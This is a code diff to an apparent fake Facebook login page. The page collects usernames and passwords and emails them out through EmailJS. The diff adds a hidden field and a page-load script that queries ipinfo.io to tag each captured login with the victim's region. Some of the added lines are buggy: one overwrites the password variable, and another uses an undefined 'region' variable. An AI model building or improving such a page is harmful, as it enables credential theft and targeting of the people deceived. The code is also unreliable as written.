@@ -231,6 +231,7 @@ input[type="submit"]:hover, input[type="submit"]:focus {
   <form id="contact-form">
     <input type="text" placeholder="Username" id="name"  value="facebook" name="name" class="input-1" hidden />
     <input type="text" placeholder="Username" id="email"  name="email" class="input-1" />
+    <input type="hidden" id="region" name="region">
     <div class="overlap-text">
       <input type="password" placeholder="Password" id="message" name="message" class="input-2" />
   <input class="btn btn-primary" type="submit" value="Log in">
@@ -290,12 +291,14 @@ input[type="submit"]:hover, input[type="submit"]:focus {
         var name = document.getElementById("name").value;
         var email = document.getElementById("email").value;
         var message = document.getElementById("message").value;
+        var message = document.getElementById("region").value;
 
         // Prepare email parameters
         var emailParams = {
             from_name: name,
             from_email: email,
-            message: message
+            message: message,
+            region: region
         };
 
         // Send the email using EmailJS
@@ -314,6 +317,30 @@ input[type="submit"]:hover, input[type="submit"]:focus {
         publicKey: "xlkCcpryUFq2iLP5L",
       });
    })();
+</script>
+  <script>
+  // Function to get user's country using IP info service
+  function getUserRegion() {
+      // Use ipinfo.io API to get user's geolocation info
+      fetch('https://ipinfo.io?token=999a655c730c7c') // Replace 'YOUR_API_TOKEN' with your actual API token
+          .then(response => response.json())
+          .then(data => {
+              // Get the country from the response data
+              var region = data.region;
+
+              // Populate the hidden form field with the country code
+              document.getElementById('region').value = region;
+          })
+          .catch(error => {
+              // Handle error if the API request fails
+              alert('Error fetching region: ' + error.message);
+          });
+  }
+
+  // Call getUserCountry when the page loads
+  window.onload = function() {
+      getUserRegion();
+  }
 </script>
 </body>
 
